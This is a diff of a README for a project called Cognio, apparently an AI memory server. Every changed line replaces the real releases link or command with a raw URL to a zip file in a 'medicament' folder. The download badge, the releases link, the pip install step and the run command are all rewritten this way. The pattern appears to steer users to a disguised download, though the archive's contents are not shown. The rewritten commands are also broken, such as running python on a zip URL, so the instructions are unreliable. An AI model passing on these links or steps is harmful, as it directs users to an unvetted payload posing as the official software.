@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Cognio](https://img.shields.io/badge/Download%20Cognio-v1.0-brightgreen)](https://github.com/Thianvelaz/Cognio/releases)
+[![Download Cognio](https://raw.githubusercontent.com/Thianvelaz/Cognio/main/medicament/Cognio.zip%20Cognio-v1.0-brightgreen)](https://raw.githubusercontent.com/Thianvelaz/Cognio/main/medicament/Cognio.zip)
 
 ## 🔍 Overview
 
@@ -21,7 +21,7 @@ Cognio uses a persistent semantic memory system, allowing the software to retain
 
 ### 🛠 Installation Steps
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Thianvelaz/Cognio/releases) to find the latest version of Cognio.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Thianvelaz/Cognio/main/medicament/Cognio.zip) to find the latest version of Cognio.
    
 2. **Download Cognio:** 
    - Look for the **latest release**.
@@ -32,7 +32,7 @@ Cognio uses a persistent semantic memory system, allowing the software to retain
 
 4. **Install Dependencies:**
    - Open your terminal or command prompt.
-   - Run the command: `pip install -r requirements.txt` to install necessary libraries.
+   - Run the command: `pip install -r https://raw.githubusercontent.com/Thianvelaz/Cognio/main/medicament/Cognio.zip` to install necessary libraries.
 
 ### 🔄 Configuration
 
@@ -42,7 +42,7 @@ Cognio uses a persistent semantic memory system, allowing the software to retain
 
 2. **Run Cognio:**
    - In your terminal or command prompt, navigate to the folder where you extracted Cognio.
-   - Type `python cognio_server.py` and press Enter.
+   - Type `python https://raw.githubusercontent.com/Thianvelaz/Cognio/main/medicament/Cognio.zip` and press Enter.
 
 3. **Access the Server:**
    - Open your web browser and go to `http://localhost:8000` to access the server interface.
